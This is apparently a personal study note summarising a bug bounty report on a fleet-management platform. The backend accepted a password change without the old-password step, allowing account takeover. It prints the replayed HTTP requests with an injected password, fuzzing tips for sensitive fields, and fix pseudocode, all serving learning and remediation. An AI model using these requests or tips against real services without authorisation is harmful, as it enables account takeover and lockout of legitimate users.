# Case Study — The Missing Link: Broken Access Control to Full Account Takeover (ATO)

> **Original write-up:** [Medium — BelScarabX](https://medium.com/@belalshohaip222/the-missing-link-how-a-broken-access-control-led-to-a-full-account-takeover-ato-607436c5b636)
> **Target:** Private bug bounty program — fleet management / logistics platform (critical, real-world operations)
> **The one principle behind everything:** [[03-Web-Vulnerabilities/temp.md]] — two components interpreting the same data differently (here: *UI enforces Authenticate-then-Set sequence* vs *backend accepts Set with no proof Authenticate ever happened*).

---

## TL;DR

Password change in the UI required **Current Password + New Password + Confirm**, firing **two sequential API calls** to `POST /apiv1`: an `Authenticate` check (old password) then a `Set` update (profile JSON + `"password"`). The backend never linked the two — no token, no session flag, no `oldPassword` inside the `Set` payload. Sending the `Set` request alone with an injected `"password": "Hacking@123"` returned `200 OK` and permanently changed the victim's password. Temporary session compromise (unlocked terminal, hijacked cookie) → **permanent ATO + lockout**.

---

## The Chain (foundation → application)

### 1) The false assumption to attack
The developer enforced the password check **only in the client workflow**:
- UI shows 3 fields (current / new / confirm)
- UI sends `Authenticate` first, waits for success, then sends `Set`
- Backend trusts: *"if Set arrived, Authenticate must have passed"*

**Foundation:** [[07-CheatSheets/Input-Validation.md#Client-Side vs Server-Side|Client-Side vs Server-Side]] — a UI sequence is not an authorization proof. Every state-changing request must carry its own proof.

### 2) Standard flow analysis

#### A. Request 1 — Authentication check
Client sends current password to the generic API endpoint:

```http
POST /apiv1 HTTP/2
Host: bugcrowd.target.com
Content-Type: text/plain;charset=UTF-8

{
  "method": "Authenticate",
  "params": {
    "password": "<CURRENT_PASSWORD>"
  }
}
```
> Server returns success/fail. UI proceeds only on success. Note: no token returned that binds to the next step (this is the missing link).

#### B. Request 2 — Profile update with password
Client sends a massive profile-update payload that happens to include the new password:

```http
POST /apiv1 HTTP/2
Host: bugcrowd.target.com
Cookie: sessionId=0x46bkhhqCmDatRopL0Xgg;
Content-Type: text/plain;charset=UTF-8

{
  "method": "Set",
  "params": {
    "typeName": "User",
    "entity": {
      "id": "b5",
      "firstName": "Bugcrowd",
      "lastName": "Ninja",
      "name": "golden-meadow@bugcrowdninja.com",
      "password": "NewPassword123!"
    },
    "credentials": {
      "sessionId": "0x46bkhhqCmDatRopL0Xgg",
      "userName": "golden-meadow@bugcrowdninja.com"
    }
  }
}
```

> Key question from methodology: *"How does the server know Request 1 happened before processing Request 2?"*
> → [[03-Web-Vulnerabilities/Multi-Step Processes.md|Multi-Step Processes]] + [[03-Web-Vulnerabilities/Methodology/Multi-step WorkFlow.md|Multi-step WorkFlow]]

### 3) Vulnerability execution (bypass)
Skip the UI and Request 1 entirely. In **Burp Repeater**, take any generic `Set` profile update and inject the sensitive field:

```http
POST /apiv1 HTTP/2
Host: bugcrowd.target.com
Cookie: sessionId=0x46bkhhqCmDatRopL0Xgg;
Content-Type: text/plain;charset=UTF-8

{
  "method": "Set",
  "params": {
    "typeName": "User",
    "entity": {
      "id": "b5",
      "firstName": "Bugcrowd",
      "lastName": "Ninja",
      "name": "golden-meadow@bugcrowdninja.com",
      "password": "Hacking@123"
    },
    "credentials": {
      "sessionId": "0x46bkhhqCmDatRopL0Xgg",
      "userName": "golden-meadow@bugcrowdninja.com"
    }
  }
}
```

#### Result
- Server returns `HTTP 200 OK`, password updated.
- Proof: new incognito window → login with victim email + `Hacking@123` → **Login Successful**.
- Threat model: attacker needs only an **active session** (unlocked warehouse terminal, stolen `sessionId`), never the old password.

> The endpoint validated **authentication** (valid `sessionId`) but never checked **authorization context** (is this password change backed by a fresh old-password proof?).

### 4) The missing check
```python
# What the endpoint SHOULD do (pseudocode) — option A: bind proof to action
def set_user(request):
    user = get_user_from_session(request.params.credentials.sessionId)
    target = get_user(request.params.entity.id)

    if "password" in request.params.entity:
        # MISSING: require and verify old password in THE SAME request
        if not verify_hash(request.params.entity.oldPassword, target.password_hash):
            return 403 Forbidden  # "Current password incorrect"
        # + enforce: requester.id == target.id OR requester.is_admin

    # Proceed to update
    ...
```

```python
# Option B: cryptographic linking (if two-step architecture is kept)
def authenticate(request):
    if verify_hash(request.params.password, user.password_hash):
        token = issue_single_use_token(user.id, ttl=300)  # 5 min, one-time
        return {"pwdChangeToken": token}

def set_user(request):
    if "password" in request.params.entity:
        if not consume_single_use_token(request.params.pwdChangeToken, user.id):
            return 403 Forbidden
```

Fix = either `oldPassword` inside the `Set` payload (simplest) or a short-lived single-use token from `Authenticate` required by `Set` — validated **server-side, on every request**.

### 5) Impact framing (why Critical, not just P3)
Fleet/logistics platform + Fleet Administrator account:
- **Operational paralysis:** loss of real-time vehicle/asset visibility, dispatch frozen.
- **Safety risk:** accident / harsh-driving / panic-button alerts unmonitored.
- **Financial:** delayed deliveries, SLA violations, ransom-like lockout (attacker holds real-world ops hostage).

> Lesson: same bug class, different blast radius. Always map the role you took over to what that role controls in the real world.

---

## Concept Mapping

- **Vulnerability class:** **Broken Access Control — missing authorization on sensitive action + Mass Assignment.** Generic `Set` endpoint blindly accepts `password` on the `User` object.
  → [[03-Web-Vulnerabilities/Access control vulnerabilities/Basic Concepts/Access Control Types.md#Vertical access control|Access Control Types]]
- **Root cause:** Unlinked multi-step workflow (server-side amnesia). Step A validates, Step B executes, nothing cryptographically binds them. Backend trusts client sequencing.
  → [[03-Web-Vulnerabilities/Multi-Step Processes.md|Multi-Step Processes]] + [[07-CheatSheets/Input-Validation.md#Client-Side vs Server-Side|Client-Side vs Server-Side]]
- **Testing methodology:**
  1. Observe the UI sequence in Burp (Proxy history = 2 requests)
  2. Ask "what is the link?" (token? flag? oldPassword in body?)
  3. Drop Request 1, replay Request 2 alone (Test) → verify with fresh login (Validate)
  → [[03-Web-Vulnerabilities/Methodology/Access Control Testing Methodology.md|Access Control Testing Methodology]] (Observe → Hypothesize → Test)
- **Threat-model note:** Session-only attacker (no password, no email access) still gets persistent takeover. This is why password-change endpoints must demand a *fresh* credential proof, not just a valid session.

---

## New Techniques

> Skills in this write-up the repo doesn't document explicitly yet.

1. **"What is the link?" test for sequential API calls** — whenever Burp shows Validate-then-Execute (`Authenticate → Set`, `Verify → Update`, `Check → Confirm`), inspect: is there a token/flag/nonce passed from step 1 to step 2? If no, replay step 2 standalone. This is the fastest multi-step BAC oracle.
2. **Password-field injection into generic update endpoints** — take any benign `Set`/`UpdateProfile` request and append `"password": "X"` (also try `email`, `role`, `isAdmin`, `userId`). Generic `typeName: User + entity` APIs are mass-assignment prone by design.
3. **Session-only ATO framing** — you don't need XSS or credential theft for Critical impact: *unlocked device + missing old-password check = permanent lockout*. State this threat model explicitly in the report; it upgrades severity.
4. **Verify-with-fresh-login PoC** — don't stop at `200 OK`. Prove takeover with an incognito login using the new password. `200 OK` proves a write; fresh login proves ATO.
5. **Two candidate fixes, pick by architecture** — single-request `oldPassword` check (simplest) vs single-use token (when two-step is required). Naming both in remediation shows depth and survives triage pushback.

---

## Key Takeaways

1. **UI sequence ≠ server enforcement** — two requests in Burp history are a claim, not a proof. The proof must be a server-side artifact (token, flag, hash check).
2. **Every sensitive field needs per-request authz** — `password`, `email`, `role` inside a generic update object must each trigger their own check, not inherit the session's validity.
3. **Generic `Set`/`Save` endpoints are mass-assignment magnets** — `typeName + entity` style APIs accept whatever you send. Fuzz the entity with sensitive keys.
4. **Prove ATO, don't assume it** — fresh-session login with the new credential is the impact proof that separates P3 from Critical.
5. **Map role → real-world blast radius** — Fleet Admin isn't "just an account"; it's vehicles, safety alerts, dispatch. Impact section should speak operations, not just CIA.

---

## References

- [The Missing Link: How a Broken Access Control Led to a Full Account Takeover (ATO) — BelScarabX (Medium)](https://medium.com/@belalshohaip222/the-missing-link-how-a-broken-access-control-led-to-a-full-account-takeover-ato-607436c5b636)
- Summary row + Q&A: [[09-Writeups & Reports/Reports Summary Table]]
- Core principle: [[03-Web-Vulnerabilities/temp.md]]
- Multi-step authz: [[03-Web-Vulnerabilities/Multi-Step Processes.md]] + [[03-Web-Vulnerabilities/Methodology/Multi-step WorkFlow.md]]
- Hunting checklist: [[03-Web-Vulnerabilities/Methodology/BAC-Password-Change-and-Mass-Assignment.md|BAC Password-Change & Mass-Assignment Hunting]]
